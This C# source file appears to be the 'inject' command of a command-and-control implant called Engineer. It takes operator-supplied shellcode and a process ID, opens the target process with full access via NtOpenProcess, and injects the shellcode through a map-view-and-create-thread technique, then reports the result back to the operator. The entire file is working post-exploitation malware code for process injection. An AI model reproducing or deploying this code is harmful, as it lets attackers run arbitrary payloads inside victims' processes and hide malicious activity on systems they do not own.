using System;
using System.Diagnostics;
using System.Threading.Tasks;
using DynamicEngLoading;
using Engineer.Extra;


namespace Engineer.Commands
{
    internal class Inject : EngineerCommand
    {
        public override string Name => "inject";
        public override async Task Execute(EngineerTask task)
        {
            try 
            {
                if (task.File.Length < 1)
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("No shellcode provided",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
                //convert from base64 string to byte array
                byte[] shellcode = task.File;

                if (!task.Arguments.TryGetValue("/pid", out string pid))
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("No pid provided",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
                int pidInt = int.Parse(pid.TrimStart(' '));
                var processToInject = Process.GetProcessById(pidInt);

               // IntPtr processPointer = h_DynInv_Methods.Ker32FuncWrapper.OpenProcess(h_DynInv_Methods.Win32.Kernel32..ProcessAllFlags, false, pidInt);
                IntPtr processPointer =  h_DynInv_Methods.NtFuncWrapper.NtOpenProcess((uint)processToInject.Id, h_DynInv.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS);
                if (Inj_techs.MapViewCreateThread(shellcode, processPointer))
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("process injected",task,EngTaskStatus.Complete,TaskResponseType.String);
                    return;
                }
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Failed to inject, if owned by another user make sure current process is in high integrity or has seDebug privs",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
            }
            catch(Exception e)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(e.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
            }
        }


        
    }
}
